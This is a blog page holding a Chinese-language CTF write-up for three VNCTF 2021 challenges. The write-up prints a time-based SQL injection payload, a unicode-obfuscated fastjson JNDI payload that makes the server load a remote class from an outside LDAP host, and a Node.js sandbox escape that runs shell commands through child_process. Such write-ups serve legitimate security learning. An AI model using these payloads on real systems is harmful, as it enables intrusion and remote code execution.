@@ -1,0 +1,194 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Vnctf2021 | f4l1k_blog</title><meta name="keywords" content="CTF"><meta name="author" content="f4l1k"><meta name="copyright" content="f4l1k"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Ez_game是一个用js写的前端小游戏，直接找到初始化的函数将生命和武器调大  直接调用初始化函数Init()和NextLevel()函数跳关，通关即可  realezjvav笛卡尔积注入以及fastjson RCE  进去以后是一个登录页面，提示数据量不大 猜测是sql注入，fuzz一下  报错注入，时间注入都被禁了，最终尝试笛卡尔积注入成功 payload username&#x3D;admin&amp;am">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vnctf2021">
+<meta property="og:url" content="http://example.com/2021/10/31/general/VNctf2021wp/index.html">
+<meta property="og:site_name" content="f4l1k_blog">
+<meta property="og:description" content="Ez_game是一个用js写的前端小游戏，直接找到初始化的函数将生命和武器调大  直接调用初始化函数Init()和NextLevel()函数跳关，通关即可  realezjvav笛卡尔积注入以及fastjson RCE  进去以后是一个登录页面，提示数据量不大 猜测是sql注入，fuzz一下  报错注入，时间注入都被禁了，最终尝试笛卡尔积注入成功 payload username&#x3D;admin&amp;am">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/fire.JPG">
+<meta property="article:published_time" content="2021-10-31T08:31:17.000Z">
+<meta property="article:modified_time" content="2021-10-31T10:10:12.367Z">
+<meta property="article:author" content="f4l1k">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/fire.JPG"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/10/31/general/VNctf2021wp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vnctf2021',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-31 18:10:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/konglong.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/fire.JPG')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">f4l1k_blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vnctf2021</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-10-31T10:10:12.367Z" title="Updated 2021-10-31 18:10:12">2021-10-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">836</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>4min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vnctf2021"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p>是一个用js写的前端小游戏，直接找到初始化的函数将生命和武器调大</p>
+<p><img src="/2021/10/31/general/VNctf2021wp/image-20210316150206190.png" alt="image-20210316150206190"></p>
+<p>直接调用初始化函数Init()和NextLevel()函数跳关，通关即可</p>
+<p><img src="/2021/10/31/general/VNctf2021wp/image-20210316150647294.png" alt="image-20210316150206190"></p>
+<h2 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h2><p>笛卡尔积注入以及fastjson RCE </p>
+<p>进去以后是一个登录页面，提示数据量不大</p>
+<p>猜测是sql注入，fuzz一下</p>
+<p><img src="/2021/10/31/general/VNctf2021wp/image-20210316153519410.png" alt="image-20210316153519410"></p>
+<p>报错注入，时间注入都被禁了，最终尝试笛卡尔积注入成功</p>
+<p>payload</p>
+<p><code>username=admin&amp;password=1&#39;and if((ascii(substr((select database(),1,1))&lt;200),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),0);#</code></p>
+<p>相应时间大概0.6s，最终跑出密码成功登陆</p>
+<p>查看源码，发现一处可以任意文件读取</p>
+<p><strong><img src="/2021/10/31/general/VNctf2021wp/image-20210316162413676.png" alt="image-20210316162413676"></strong></p>
+<p>尝试读取springboot的pom.xml</p>
+<p><img src="/2021/10/31/general/VNctf2021wp/image-20210316162558262.png" alt="image-20210316162558262"></p>
+<p>看到了使用了fastjson，并且该版本有RCE,尝试利用</p>
+<p>利用github上师傅的项目</p>
+<p><code>&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:7777/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</code></p>
+<p>发现有过滤，后来大师傅说可以unicode绕过，然后找到P牛星球上的文章</p>
+<p><img src="/2021/10/31/general/VNctf2021wp/image-20210316163016012.png" alt="image-20210316163016012"></p>
+<p>将部分关键词替换unicode编码</p>
+<p>利用大师傅的项目即可弹shell</p>
+<p>附上链接<code>https://github.com/CaijiOrz/fastjson-1.2.47-RCE</code></p>
+<p>最终payload</p>
+<p><code>&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://106.15.250.31:1389/Exploit&quot;,&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;:true&#125;&#125;&#125;</code></p>
+<h2 id="navie"><a href="#navie" class="headerlink" title="navie"></a>navie</h2><p>一道js配合re题，web🐶实在不会</p>
+<p>源码奉上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import express from &quot;express&quot;;</span><br><span class="line">import bindings from &quot;bindings&quot;;</span><br><span class="line">import &#123; fileURLToPath &#125; from &#x27;url&#x27;</span><br><span class="line">import path from &quot;path&quot;;</span><br><span class="line"></span><br><span class="line">import pkg from &#x27;expression-eval&#x27;;</span><br><span class="line">const &#123; eval: eval_, parse &#125; = pkg;</span><br><span class="line"></span><br><span class="line">const addon = bindings(&quot;addon&quot;);</span><br><span class="line"></span><br><span class="line">const file = fileURLToPath(import.meta.url);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line">app.use(express.urlencoded(&#123; extended: true &#125;));</span><br><span class="line"></span><br><span class="line">app.use(express.static(&quot;static&quot;));</span><br><span class="line"></span><br><span class="line">app.use(&quot;/eval&quot;, (req, res) =&gt; &#123;</span><br><span class="line">  const e = req.body.e;</span><br><span class="line">  const code = req.body.code;</span><br><span class="line">  if (!e || !code) &#123;</span><br><span class="line">    res.send(&quot;wrong?&quot;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  try &#123;</span><br><span class="line">    if (addon.verify(code)) &#123;</span><br><span class="line">      res.send(String(eval_(parse(e))));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      res.send(&quot;wrong?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    console.log(e)</span><br><span class="line">    res.send(&quot;wrong?&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(&quot;/source&quot;, (req, res) =&gt; &#123;</span><br><span class="line">  let p = req.query.path || file;</span><br><span class="line">  p = path.resolve(path.dirname(file), p);</span><br><span class="line">  if (p.includes(&quot;flag&quot;)) &#123;</span><br><span class="line">    res.send(&quot;no flag!&quot;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    res.sendFile(p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use((err, req, res, next) =&gt; &#123;</span><br><span class="line">  console.log(err)</span><br><span class="line">  res.redirect(&quot;index.html&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(process.env.PORT || 80);</span><br></pre></td></tr></table></figure>
+
+<p>看到导入了一个自己写的模块，并且可以读取文件</p>
+<p>并且说明静态目录为static，可以尝试读取binding.gyp</p>
+<p><img src="/2021/10/31/general/VNctf2021wp/image-20210316171820329.png" alt="image-20210316171820329"></p>
+<p>或者去读运行的服务也可以读到</p>
+<p><img src="/2021/10/31/general/VNctf2021wp/image-20210316171950805.png" alt="image-20210316171950805"></p>
+<p>总之我们知道生成了一个addon模块，尝试去读addon模块</p>
+<p>查阅资料知道默认会在./build/Release/下生成.node文件，也就是addon.node</p>
+<p><img src="/2021/10/31/general/VNctf2021wp/image-20210316172158973.png" alt="image-20210316172158973"></p>
+<p>下载后反编译拿到code(ps:我不会🐶)</p>
+<p>利用constructor构造函数，并利用import动态导入</p>
+<p>发现并无法弹shell，只能利用写入文件读</p>
+<p>payload</p>
+<p><code>e=(1).constructor.constructor(&quot;return import(&#39;child_process&#39;).then(child_process=&gt;&#123;child_process.exec(&#39;cat /flag &gt; ./test &#39;)&#125;)&quot;)();&amp;code=yoshino-s_want_a_gf%2Cqq1735439536</code></p>
+<p><img src="/2021/10/31/general/VNctf2021wp/image-20210316172827716.png" alt="image-20210316172827716"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">f4l1k</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/31/general/VNctf2021wp/">http://example.com/2021/10/31/general/VNctf2021wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="/img/fire.JPG" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/31/general/%5BQWB%5DHardXss/"><img class="prev-cover" src="/img/fire.JPG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">HardXss复现</div></div></a></div><div class="next-post pull-right"><a href="/2021/10/31/general/%5BHTB%5DLaboratory/"><img class="next-cover" src="/img/fire.JPG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Laboratory</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/10/31/general/DASCTF/" title="DASCTF"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">DASCTF</div></div></a></div><div><a href="/2021/10/31/general/%5BQWB%5DHardXss/" title="HardXss复现"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">HardXss复现</div></div></a></div><div><a href="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/" title="HXB writeup"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">HXB writeup</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/konglong.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">f4l1k</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/falipan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/falipan" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ez-game"><span class="toc-number">1.</span> <span class="toc-text">Ez_game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#realezjvav"><span class="toc-number">2.</span> <span class="toc-text">realezjvav</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#navie"><span class="toc-number">3.</span> <span class="toc-text">navie</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/DASCTF/" title="DASCTF"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF"/></a><div class="content"><a class="title" href="/2021/10/31/general/DASCTF/" title="DASCTF">DASCTF</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/%5BHTB%5DDT/" title="Docter"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docter"/></a><div class="content"><a class="title" href="/2021/10/31/general/%5BHTB%5DDT/" title="Docter">Docter</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/%5BQWB%5DHardXss/" title="HardXss复现"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HardXss复现"/></a><div class="content"><a class="title" href="/2021/10/31/general/%5BQWB%5DHardXss/" title="HardXss复现">HardXss复现</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/VNctf2021wp/" title="Vnctf2021"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vnctf2021"/></a><div class="content"><a class="title" href="/2021/10/31/general/VNctf2021wp/" title="Vnctf2021">Vnctf2021</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/%5BHTB%5DLaboratory/" title="Laboratory"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Laboratory"/></a><div class="content"><a class="title" href="/2021/10/31/general/%5BHTB%5DLaboratory/" title="Laboratory">Laboratory</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By f4l1k</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
